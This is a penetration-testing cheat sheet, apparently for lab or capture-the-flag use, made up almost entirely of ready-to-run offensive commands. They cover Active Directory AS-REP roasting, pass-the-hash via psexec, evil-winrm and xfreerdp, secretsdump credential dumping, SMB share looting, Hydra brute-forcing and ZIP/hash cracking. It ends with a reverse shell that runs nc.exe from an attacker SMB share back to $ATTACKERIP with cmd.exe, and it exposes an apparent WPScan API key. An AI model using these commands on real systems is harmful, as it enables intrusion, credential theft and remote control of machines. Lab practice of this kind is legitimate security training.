## Active Directory

#### Decrypting Group Policy Preferences Cpassword

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ 
```

#### Bloodhound

```powershell
# Bloodhound data collection using SharpHound
PS C:\htb> Import-Module .\SharpHound.ps1
PS C:\htb> Invoke-BloodHound -CollectionMethod all -ZipFileName data
```

#### ASREProast

```bash
# users list dynamically queried with an LDAP anonymous bind
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# with a users file
GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# users list dynamically queried with a LDAP authenticated bind (password)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# users list dynamically queried with a LDAP authenticated bind (NT hash)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

#### Kerbrute

```bash
# Enumerating users
kerbrute userenum --dc '$IP' -d '$DOMAIN' <users.txt> -v
```

#### LDAP

```bash
# Using ldapsearch
ldapsearch -H ldap://$IP -x -s base

# Using nmap
nmap -Pn --script "ldap* and not brute" -p 389 $IP
```

#### Pass the Hash 

```bash
# Using crackmapexec
sudo crackmapexec smb $IP -u $USER -H $NTLM --local-auth

# Using psexec
psexec.py $DOMAIN/$USER@$IP --hashes ':$NTLM' cmd.exe/powershell

# Using xfreerdp
xfreerdp /v:$IP:$PORT /u:$DOMAIN\\$USER /pth:$NTLM

# Using evil-winrm
evil-winrm -i $IP -u $USER -H $NTLM
```

#### Dumping Hashes

```bash
# Using secretsdump
secretsdump.py $DOMAIN/$USER:$PASS@$IP

# Using crackmapexec
sudo crackmapexec smb $IP -u $USER -d $DOMAIN -p $PASS --sam
```

## SMB

#### Display All Contents of Readable Shares

```bash
# Gathers all contents and puts in /tmp/cme_spider_plus/ip.json
sudo crackmapexec smb $IP -u '' -p '' -M spider_plus 

# Neatly displays json output
cat ip.json | jq '. |map_values(keys)'
```

#### Download All Files in a Share

```bash
# One-liner
smbclient //$IP/Share -c "prompt OFF; recurse ON; mget *"
```

#### Enumerating Guest and Anonymous and Null Access

```bash
# Using smbmap
smbmap -u "" -p "" -P 445 -H $IP
smbmap -u "guest" -p "" -P 445 -H $IP

# Using smbclient
smbclient -L //$IP/ -U "guest%"
smbclient -L //$IP/ -U "%"

# Using enum4linux-ng
enum4linux-ng.py -A -u "" -p "" 10.10.10.100
enum4linux-ng.py -A -u "guest" -p "" 10.10.10.100

#Using crackmapexec
sudo crackmapexec smb $IP -u '' -p '' --shares
sudo crackmapexec smb $IP -u 'a' -p '' --shares
```

#### Starting an SMB server to share files

```bash
# With username and password set
smbserver.py -smb2support -username $USER -password $PASS $SHARENAME $SHAREDIRECTORY

# Without username and password set
smbserver.py -smb2support $SHARENAME $SHAREDIRECTORY
```

#### Mounting a remote share

```bash
mount -t cifs //$IP/$SHARE /mnt/$PATH -o rw
```

## Nmap

#### Search for Nmap Scripts

```bash
locate -r nse$ | grep 'nfs'
```

#### Ports Output Trick

```bash
# Ex: 21,25,80,135,139,445,3389,8080,42345,23453
cat ports.txt | grep open | awk -F / '{print $1}' ORS=','
```

## Gobuster

#### Easy Dirbusting

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.170:8080/stats/ -x .php,.txt,.zip -t 100 -b 404,400
```

## Wordpress

#### Enumerating with WPScan

```bash
wpscan --url http://$IP/wp/ --api KAcJgjc4bcs5NJX0gQaFEnwDXFlLjB3OhzsGNSVZgu8 -e u,ap --plugins-detection aggressive --passwords /usr/share/wordlists/rockyou.txt
```

## Fuzzing

#### Sub Domain Fuzzing

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://redpanda.htb:8080 -H "HOST: FUZZ.redpanda.htb" --hw 119
```

#### Parameter Fuzzing

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.71.212/secret/evil.php?FUZZ=/etc/passwd' --hw 0
```

## ZIP Files

#### Cracking a ZIP File

```bash
# Using fcrackzip
fcrackzip -D -p /path-to-passfile file.zip

# Using John
zip2john file.zip > file.hash
john file.hash --wordlist=/path-to-passfile
```

## Hashcat

#### Cracking Hashes

```
# Using Windows Host
hashcat.exe -m 5600 -a 0 hashes.txt rockyou.txt
```

## AutoRecon

#### Using AutoRecon as Sudo

```bash
sudo $(which autorecon) $IP
```

## Psexec

#### Using Psexec with Valid Credentials

```bash
psexec.py $DOMAIN/$USER@$IP cmd.exe/powershell
```

#### Using Psexec to Pass the Hash

```bash
psexec.py $DOMAIN/$USER@$IP --hashes ':$NTLM' cmd.exe/powershell
```

## RDP

#### Remote Access to Windows Host

```bash
# Using xfreerdp
xfreerdp /v:$IP:$PORT /u:$USER /p:$PASS

# Using rdesktop
rdesktop $IP -u $USER -p $PASS -g 80%
```

#### Remote Access to Windows Host By Passing the Hash

```bash
xfreerdp /v:$IP:$PORT /u:$DOMAIN\\$USER /pth:$NTLM
```

## WinRM

#### Getting a shell with evil-winrm

```bash
# USing evil-winrm with valid credentials
evil-winrm -i $IP -u $USER -p $PASS

# Using evil-winrm and setting our tools location for use
evil-winrm -i $IP -u $USER -p $PASS -s ~/tools/windows/powershell
```

#### Passing the Hash with evil-winrm

```bash
evil-winrm -i $IP -u $USER -H $NTLM
```

## Hydra

#### Bruteforcing Login Portal

```bash
hydra -l $USER -P /usr/share/wordlists/rockyou.txt preprod-payroll.trick.htb -V http-form-post '/ajax.php?action=login:username=^USER^&password=^PASS^:Login Failed'
```


## Transfer Files 

#### Using SMB server

```bash
# Start up an smb server on attacker machine
# Execute an executable directly from the share on victim Windows machine
C:\> \\$ATTACKERIP\Share\nc.exe $ATTACKERIP $PORT -c cmd.exe

# Download remote file to victim Windows machine
C:\> copy \\$ATTACKERIP\Share\nc.exe C:\Windows\Temp\nc.exe

# Upload from victim host to attacker host
# Attacker Machine:
smbserver.py -smb2support $SHARE `pwd`

# Victim Machine:
C:\> net use z: \\$ATTACKERIP\Share
C:\> copy test.txt z:
```









